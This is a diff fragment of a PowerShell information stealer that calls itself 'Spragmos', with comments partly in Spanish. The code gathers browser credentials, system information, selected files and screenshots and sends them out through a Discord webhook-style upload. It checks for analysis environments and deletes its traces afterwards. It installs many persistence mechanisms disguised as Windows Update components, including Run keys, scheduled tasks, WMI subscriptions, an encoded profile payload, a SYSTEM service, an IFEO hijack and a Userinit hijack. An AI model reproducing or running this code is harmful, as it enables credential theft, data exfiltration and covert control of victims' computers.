+Content-Disposition: form-data; name="file"; filename="$fileName"
+Content-Type: $contentType
+
+"@
+                
+                # Get request stream and write form data
+                $requestStream = $request.GetRequestStream()
+                $bytes = [System.Text.Encoding]::UTF8.GetBytes($formData)
+                $requestStream.Write($bytes, 0, $bytes.Length)
+                
+                # Write file data
+                $requestStream.Write($fileBytes, 0, $fileBytes.Length)
+                
+                # Write closing boundary
+                $bytes = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
+                $requestStream.Write($bytes, 0, $bytes.Length)
+            }
+            else {
+                # No file, just content - add closing boundary
+                $formData += "--$boundary--`r`n"
+                
+                # Get request stream and write form data
+                $requestStream = $request.GetRequestStream()
+                $bytes = [System.Text.Encoding]::UTF8.GetBytes($formData)
+                $requestStream.Write($bytes, 0, $bytes.Length)
+            }
+            
+            # Close request stream
+            $requestStream.Close()
+            
+            # Get response
+            $response = $request.GetResponse()
+            $responseStream = $response.GetResponseStream()
+            $reader = New-Object System.IO.StreamReader($responseStream)
+            $responseText = $reader.ReadToEnd()
+            
+            Write-SpragmosLog "Message sent successfully" -Level "SUCCESS"
+            
+            # Clean up
+            $reader.Close()
+            $responseStream.Close()
+            $response.Close()
+            
+            return $true
+        }
+        catch {
+            Write-SpragmosLog "Error sending Discord message (attempt $($retryCount+1)): $_" -Level "ERROR"
+            
+            # Exponential backoff
+            $backoffDelay = [Math]::Pow(2, $retryCount) * 1000
+            Start-Sleep -Milliseconds $backoffDelay
+        }
+    }
+    
+    Write-SpragmosLog "Failed to send message after $MaxRetries attempts" -Level "WARNING"
+    return $false
+}
+
+# --- PERSISTENCE FUNCTIONS ---
+function Install-Persistence {
+    param(
+        [ValidateSet("Basic", "Advanced", "Comprehensive")]
+        [string]$Level = "Advanced"
+    )
+    
+    if (-not $PERSIST) { 
+        Write-SpragmosLog "Persistence disabled in configuration" -Level "INFO"
+        return 
+    }
+    
+    Write-SpragmosLog "Installing persistence mechanisms (Level: $Level)" -Level "INFO"
+    
+    # Check if we have admin rights
+    $isAdmin = $false
+    try {
+        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+        $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    }
+    catch {
+        Write-SpragmosLog "Error checking admin rights: $_" -Level "ERROR"
+    }
+    
+    # Path to copy of script for persistence
+    $scriptCopy = "$env:APPDATA\Microsoft\Windows\SystemUpdate.ps1"
+    
+    # Create a copy of the script
+    try {
+        Copy-Item -Path $PSCommandPath -Destination $scriptCopy -Force
+        Write-SpragmosLog "Created script copy at $scriptCopy" -Level "SUCCESS"
+    }
+    catch {
+        Write-SpragmosLog "Error creating script copy: $_" -Level "ERROR"
+        $scriptCopy = $PSCommandPath  # Fallback to original path
+    }
+    
+    # --- Standard User Persistence ---
+    try {
+        # 1. Registry Run Key - most basic but effective
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $regKeyName = "WindowsSystemUpdate"
+        $payload = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptCopy`""
+        
+        if (-not (Test-Path $regPath)) {
+            New-Item -Path $regPath -Force | Out-Null
+        }
+        
+        Set-ItemProperty -Path $regPath -Name $regKeyName -Value $payload -Force
+        Write-SpragmosLog "Added Run key persistence" -Level "SUCCESS"
+        
+        # 2. Scheduled Task (user context)
+        $taskName = "SystemUpdateCheck"
+        $taskDescription = "Checks for system updates and applies them"
+        
+        # Delete task if it exists
+        schtasks /delete /tn $taskName /f 2>$null | Out-Null
+        
+        # Create new task - running daily
+        $taskAction = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptCopy`""
+        schtasks /create /tn $taskName /tr $taskAction /sc daily /st 09:00 /du 24:00 /rl highest /f | Out-Null
+        Write-SpragmosLog "Added scheduled task persistence" -Level "SUCCESS"
+        
+        # 3. Startup folder
+        $startupPath = [Environment]::GetFolderPath('Startup')
+        $shortcutPath = Join-Path $startupPath "SystemUpdate.lnk"
+        
+        $wshShell = New-Object -ComObject WScript.Shell
+        $shortcut = $wshShell.CreateShortcut($shortcutPath)
+        $shortcut.TargetPath = "powershell.exe"
+        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptCopy`""
+        $shortcut.WorkingDirectory = Split-Path $scriptCopy
+        $shortcut.IconLocation = "shell32.dll,21"  # Windows Update icon
+        $shortcut.Save()
+        
+        Write-SpragmosLog "Added startup folder persistence" -Level "SUCCESS"
+    }
+    catch {
+        Write-SpragmosLog "Error setting up basic persistence: $_" -Level "ERROR"
+    }
+    
+    # --- Additional persistence for Advanced level ---
+    if ($Level -ne "Basic") {
+        try {
+            # 4. WMI Event Subscription (works in user context too)
+            Add-WmiPersistence -ScriptPath $scriptCopy
+            
+            # 5. Explorer shell extension hijack
+            Add-ExplorerShellExtension -ScriptPath $scriptCopy
+            
+            # 6. PowerShell profile persistence
+            $profilePath = "$env:USERPROFILE\Documents\WindowsPowerShell\profile.ps1"
+            $profileDir = Split-Path $profilePath
+            
+            if (-not (Test-Path $profileDir)) {
+                New-Item -Path $profileDir -ItemType Directory -Force | Out-Null
+            }
+            
+            # Add to profile - using obfuscated invoke
+            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptCopy`"' -WindowStyle Hidden"))
+            
+            $profileContent = @"
+# Windows Update Helper
+`$job = Start-Job -ScriptBlock {
+    powershell.exe -EncodedCommand $encoded
+}
+`$null = Register-ObjectEvent -InputObject `$job -EventName StateChanged -Action {}
+"@
+            
+            if (Test-Path $profilePath) {
+                # Append to existing profile
+                Add-Content -Path $profilePath -Value $profileContent
+            }
+            else {
+                # Create new profile
+                Set-Content -Path $profilePath -Value $profileContent
+            }
+            
+            Write-SpragmosLog "Added PowerShell profile persistence" -Level "SUCCESS"
+        }
+        catch {
+            Write-SpragmosLog "Error setting up advanced persistence: $_" -Level "ERROR"
+        }
+    }
+    
+    # --- Admin-only persistence for Comprehensive level ---
+    if ($isAdmin -and $Level -eq "Comprehensive") {
+        try {
+            # 7. System-wide Scheduled Task
+            $systemTaskName = "MicrosoftEdgeUpdate"
+            $systemTaskDescription = "Microsoft Edge Update Agent"
+            
+            # Delete task if it exists
+            schtasks /delete /tn $systemTaskName /f 2>$null | Out-Null
+            
+            # Create new system task
+            $systemTaskAction = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptCopy`""
+            schtasks /create /tn $systemTaskName /tr $systemTaskAction /sc onlogon /ru "SYSTEM" /rl highest /f | Out-Null
+            
+            Write-SpragmosLog "Added system-wide scheduled task persistence" -Level "SUCCESS"
+            
+            # 8. Service creation (most persistent)
+            $serviceName = "WindowsUpdateHelper"
+            $serviceDisplayName = "Windows Update Helper Service"
+            $serviceBinPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptCopy`""
+            
+            # Create service
+            New-Service -Name $serviceName -DisplayName $serviceDisplayName -Description "Helps Windows Update process find and install updates" -BinaryPathName $serviceBinPath -StartupType Automatic | Out-Null
+            
+            Write-SpragmosLog "Added service persistence" -Level "SUCCESS"
+            
+            # 9. IFEO Debugger Hijack
+            Add-IFEOHijack -ScriptPath $scriptCopy
+            
+            # 10. UserInit Registry Hijack
+            Add-UserInitHijack -ScriptPath $scriptCopy
+        }
+        catch {
+            Write-SpragmosLog "Error setting up comprehensive persistence: $_" -Level "ERROR"
+        }
+    }
+    
+    Write-SpragmosLog "Persistence installation completed" -Level "SUCCESS"
+}
+
+function Add-WmiPersistence {
+    param(
+        [string]$ScriptPath
+    )
+    
+    Write-SpragmosLog "Setting up WMI persistence" -Level "INFO"
+    
+    try {
+        # Generate random names to avoid detection
+        $filterName = "WindowsUpdateCheck_" + (Get-Random -Minimum 1000 -Maximum 9999)
+        $consumerName = "WindowsUpdateHandler_" + (Get-Random -Minimum 1000 -Maximum 9999)
+        
+        # Define event filter (trigger)
+        $eventFilter = @{
+            EventNamespace = 'root\subscription'
+            Name = $filterName
+            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+            QueryLanguage = 'WQL'
+        }
+        
+        # Define event consumer (action)
+        $eventConsumer = @{
+            Name = $consumerName
+            CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
+        }
+        
+        # Create the WMI objects
+        $filter = Set-WmiInstance -Namespace $eventFilter.EventNamespace -Class '__EventFilter' -Arguments $eventFilter
+        $consumer = Set-WmiInstance -Namespace $eventFilter.EventNamespace -Class 'CommandLineEventConsumer' -Arguments $eventConsumer
+        $binding = Set-WmiInstance -Namespace $eventFilter.EventNamespace -Class '__FilterToConsumerBinding' -Arguments @{
+            Filter = $filter
+            Consumer = $consumer
+        }
+        
+        Write-SpragmosLog "WMI persistence configured successfully" -Level "SUCCESS"
+        return $true
+    }
+    catch {
+        Write-SpragmosLog "Error setting up WMI persistence: $_" -Level "ERROR"
+        return $false
+    }
+}
+
+function Add-ExplorerShellExtension {
+    param(
+        [string]$ScriptPath
+    )
+    
+    Write-SpragmosLog "Setting up Explorer shell extension" -Level "INFO"
+    
+    try {
+        # Explorer context menu handler for specific file types
+        $fileExtensions = @(".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx")
+        $menuName = "System Info"
+        $payload = "`"powershell.exe`" -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" `"%1`""
+        
+        foreach ($ext in $fileExtensions) {
+            $regPath = "HKCU:\Software\Classes\$ext\shell\$menuName\command"
+            
+            # Create registry key structure
+            if (-not (Test-Path $regPath)) {
+                New-Item -Path $regPath -Force | Out-Null
+            }
+            
+            # Set command
+            Set-ItemProperty -Path $regPath -Name "(Default)" -Value $payload -Force
+        }
+        
+        Write-SpragmosLog "Explorer shell extension persistence configured" -Level "SUCCESS"
+        return $true
+    }
+    catch {
+        Write-SpragmosLog "Error setting up Explorer shell extension: $_" -Level "ERROR"
+        return $false
+    }
+}
+
+function Add-IFEOHijack {
+    param(
+        [string]$ScriptPath
+    )
+    
+    Write-SpragmosLog "Setting up IFEO hijack" -Level "INFO"
+    
+    try {
+        # Target a commonly used but not critical application
+        $targetBinary = "notepad.exe"
+        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$targetBinary"
+        
+        # Create registry key structure
+        if (-not (Test-Path $regPath)) {
+            New-Item -Path $regPath -Force | Out-Null
+        }
+        
+        # Define payload - launch original program after running our script
+        $payload = "`"powershell.exe`" -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Start-Process powershell -Args '-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`"' -WindowStyle Hidden; Start-Process '$env:SystemRoot\System32\$targetBinary'`""
+        
+        # Set debugger value
+        Set-ItemProperty -Path $regPath -Name "Debugger" -Value $payload -Force
+        
+        Write-SpragmosLog "IFEO hijack configured for $targetBinary" -Level "SUCCESS"
+        return $true
+    }
+    catch {
+        Write-SpragmosLog "Error setting up IFEO hijack: $_" -Level "ERROR"
+        return $false
+    }
+}
+
+function Add-UserInitHijack {
+    param(
+        [string]$ScriptPath
+    )
+    
+    Write-SpragmosLog "Setting up UserInit hijack" -Level "INFO"
+    
+    try {
+        # Path to Winlogon registry key
+        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+        
+        # Get current Userinit value
+        $currentValue = (Get-ItemProperty -Path $regPath -Name "Userinit" -ErrorAction SilentlyContinue).Userinit
+        
+        # If not found, use default value
+        if (-not $currentValue) {
+            $currentValue = "$env:SystemRoot\system32\userinit.exe,"
+        }
+        
+        # Make sure it ends with a comma
+        if (-not $currentValue.EndsWith(",")) {
+            $currentValue += ","
+        }
+        
+        # Add our payload
+        $newValue = "$currentValue powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
+        
+        # Update registry
+        Set-ItemProperty -Path $regPath -Name "Userinit" -Value $newValue -Force
+        
+        Write-SpragmosLog "UserInit hijack configured" -Level "SUCCESS"
+        return $true
+    }
+    catch {
+        Write-SpragmosLog "Error setting up UserInit hijack: $_" -Level "ERROR"
+        return $false
+    }
+}
+
+# --- MAIN EXECUTION ---
+try {
+    Write-SpragmosLog "Spragmos starting execution" -Level "INFO"
+    
+    # Check environment
+    if (-not (Test-SafeEnvironment)) {
+        Write-SpragmosLog "Unsafe environment detected, exiting" -Level "WARNING"
+        exit
+    }
+    
+    # Collect system information
+    $systemInfo = Get-SystemInformation
+    Write-SpragmosLog "System information collected" -Level "SUCCESS"
+    
+    # Collect browser credentials
+    $creds = Get-BrowserCredentials
+    Write-SpragmosLog "Browser credentials collected" -Level "SUCCESS"
+    
+    # Find interesting files
+    $files = Find-InterestingFiles
+    Write-SpragmosLog "Found $($files.Count) interesting files" -Level "SUCCESS"
+    
+    # Take screenshot
+    $screenshotPath = Capture-Screenshot
+    Write-SpragmosLog "Screenshot captured: $screenshotPath" -Level "SUCCESS"
+    
+    # Create report
+    $report = @"
+=== SPRAGMOS STEALER REPORT ===
+Timestamp: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+
+=== SYSTEM INFORMATION ===
+$systemInfo
+
+=== CREDENTIALS ===
+$creds
+
+=== FILES FOUND ===
+$($files.FullName -join "`n")
+"@
+    
+    $reportPath = "$env:TEMP\system_report_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+    $report | Out-File $reportPath -Encoding UTF8
+    Write-SpragmosLog "Report saved to $reportPath" -Level "SUCCESS"
+    
+
+    # Exfiltrate data
+    $exfilSuccessful = $false # Asumir fallo inicialmente
+
+    Write-SpragmosLog "Attempting to exfiltrate main report to Discord..." -Level "INFO"
+    # --- Intenta enviar el reporte principal ---
+    if (Send-DiscordMessage -Message " Spragmos Report: $env:COMPUTERNAME ($env:USERNAME)" -FilePath $reportPath) {
+        # --- ÉXITO: Reporte principal enviado ---
+        Write-SpragmosLog "Successfully sent main report." -Level "SUCCESS"
+        $exfilSuccessful = $true # Marcar exfiltración como (al menos parcialmente) exitosa
+
+        # --- Intento de enviar captura de pantalla (como extra opcional) ---
+        if ($screenshotPath -and (Test-Path $screenshotPath)) {
+            Write-SpragmosLog "Attempting to exfiltrate screenshot..." -Level "INFO"
+            if (Send-DiscordMessage -Message " Screenshot from $env:COMPUTERNAME" -FilePath $screenshotPath) {
+                Write-SpragmosLog "Successfully sent screenshot." -Level "SUCCESS"
+            } else {
+                # No es crítico si falla, solo loguear
+                Write-SpragmosLog "Failed to send screenshot (non-critical)." -Level "WARNING"
+            }
+        } else {
+             Write-SpragmosLog "Screenshot not available or path invalid, skipping screenshot exfiltration." -Level "INFO"
+        }
+
+        # --- Intento de enviar archivos interesantes (como extra opcional) ---
+        if ($files -and $files.Count -gt 0) {
+            Write-SpragmosLog "Attempting to exfiltrate interesting files (up to 10)..." -Level "INFO"
+            $fileCount = 0
+            $filesSentCount = 0
+            foreach ($file in $files) {
+                # Límite para evitar abuso/detección
+                if ($fileCount -ge 10) {
+                    Write-SpragmosLog "Reached file limit (10), stopping file exfiltration." -Level "INFO"
+                    break
+                }
+
+                if (Test-Path $file.FullName) {
+                    if ($file.Length -lt $MAX_FILE_SIZE) {
+                        Write-SpragmosLog "Attempting to send file: $($file.Name)" -Level "DEBUG"
+                        if (Send-DiscordMessage -Message " File from $env:COMPUTERNAME: $($file.Name)" -FilePath $file.FullName) {
+                            Write-SpragmosLog "Successfully sent file: $($file.Name)" -Level "SUCCESS"
+                            $filesSentCount++
+                            # Pausa para evitar rate limiting de Discord
+                            Start-Sleep -Milliseconds (Get-Random -Minimum 700 -Maximum 2500)
+                        } else {
+                             Write-SpragmosLog "Failed to send file: $($file.Name)" -Level "WARNING" # Loguear fallo pero continuar
+                        }
+                    } else {
+                        # Asegúrate que esta llave cierra el 'else' del tamaño de archivo
+                        Write-SpragmosLog "Skipping file due to size: $($file.Name) ($($file.Length / 1KB) KB)" -Level "WARNING"
+                    } # <<< FIN DEL ELSE (Tamaño de archivo)
+                } else {
+                    Write-SpragmosLog "File path no longer valid, skipping: $($file.FullName)" -Level "WARNING"
+                }
+                $fileCount++ # Incrementar contador para el límite de 10
+            } # <<< FIN DEL FOREACH ($file in $files)
+             Write-SpragmosLog "Finished attempting file exfiltration. Sent $filesSentCount files." -Level "INFO"
+        } else {
+            Write-SpragmosLog "No interesting files found or selected for exfiltration." -Level "INFO"
+        }
+
+    } # <<< --- FIN DEL BLOQUE IF (Éxito al enviar reporte principal) --- >>>
+    else {
+        # --- FALLO: Reporte principal NO enviado ---
+        Write-SpragmosLog "CRITICAL: Failed to send main report after retries." -Level "ERROR"
+        # $exfilSuccessful sigue siendo false, la persistencia no se instalará
+    } # <<< --- FIN DEL BLOQUE ELSE (Fallo al enviar reporte principal) --- >>>
+
+    # --- Continuar dentro del bloque TRY principal ---
+
+    # Instalar persistencia SOLO si el reporte principal se envió con éxito
+    if ($exfilSuccessful -and $PERSIST) {
+        Write-SpragmosLog "Main exfiltration successful, proceeding with persistence installation." -Level "INFO"
+        Install-Persistence -Level "Advanced" # O el nivel que desees/configures
+    } elseif (-not $exfilSuccessful) {
+        Write-SpragmosLog "Main exfiltration failed, skipping persistence installation." -Level "WARNING"
+    }
+
+    # Limpiar evidencia (archivos temporales de reporte y captura)
+    # (Este bloque try/catch es para el cleanup en sí mismo)
+    Write-SpragmosLog "Starting evidence cleanup..." -Level "INFO"
+    try {
+        if (Test-Path $reportPath) {
+            Remove-Item $reportPath -Force -ErrorAction SilentlyContinue
+            Write-SpragmosLog "Removed report file: $reportPath" -Level "DEBUG"
+        }
+        if ($screenshotPath -and (Test-Path $screenshotPath)) {
+            Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
+            Write-SpragmosLog "Removed screenshot file: $screenshotPath" -Level "DEBUG"
+        }
+        Write-SpragmosLog "Evidence cleanup completed." -Level "SUCCESS"
+    }
+    catch {
+        # Asegúrate que la interpolación de variable aquí también esté corregida
+        Write-SpragmosLog "Error during cleanup: $($_.Exception.Message)" -Level "ERROR"
+    }
+
+Write-SpragmosLog "Spragmos execution finished." -Level "SUCCESS"
+
+} # <<< === LLAVE DE CIERRE AÑADIDA ===
+catch {
+    Write-SpragmosLog "Critical error during execution: $($_.Exception.Message)"
+}
